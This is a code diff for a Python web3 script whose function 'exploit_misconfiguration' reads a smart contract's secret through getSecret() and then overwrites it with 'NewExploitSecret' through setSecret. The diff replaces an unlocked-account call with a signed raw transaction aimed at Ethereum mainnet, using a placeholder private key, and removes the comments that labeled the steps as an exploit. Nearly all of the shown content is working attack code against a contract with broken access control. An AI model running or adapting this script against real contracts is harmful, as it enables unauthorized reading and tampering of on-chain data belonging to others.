@@ -28,19 +28,35 @@ ABI = [
 web3 = Web3(Web3.HTTPProvider(INFURA_URL))
 contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)
 
-# Exploit the misconfiguration
 def exploit_misconfiguration():
-    # Step 1: Access the secret (assuming the contract is misconfigured and allows anyone to read it)
+    # Access the secret
     try:
         secret = contract.functions.getSecret().call()
         print(f"Secret accessed: {secret}")
     except Exception as e:
         print("Failed to access secret:", e)
 
-    # Step 2: Set a new secret (if the contract allows any address to update it)
+    # Set a new secret (requires a valid Ethereum account)
     try:
-        tx = contract.functions.setSecret("NewExploitSecret").transact({'from': web3.eth.accounts[0]})
-        web3.eth.waitForTransactionReceipt(tx)
+        # Replace 'your_private_key' with the actual private key of an account with sufficient ETH
+        private_key = 'your_private_key'
+        account = web3.eth.account.privateKeyToAccount(private_key)
+        
+        # Prepare transaction
+        transaction = contract.functions.setSecret("NewExploitSecret").buildTransaction({
+            'chainId': 1,  # Mainnet
+            'gas': 2000000,
+            'gasPrice': web3.toWei('10', 'gwei'),
+            'nonce': web3.eth.getTransactionCount(account.address),
+        })
+        
+        # Sign transaction
+        signed_txn = web3.eth.account.sign_transaction(transaction, private_key=private_key)
+        
+        # Send transaction
+        tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
+        web3.eth.waitForTransactionReceipt(tx_hash)
+        
         print("New secret set successfully.")
     except Exception as e:
         print("Failed to set new secret:", e)
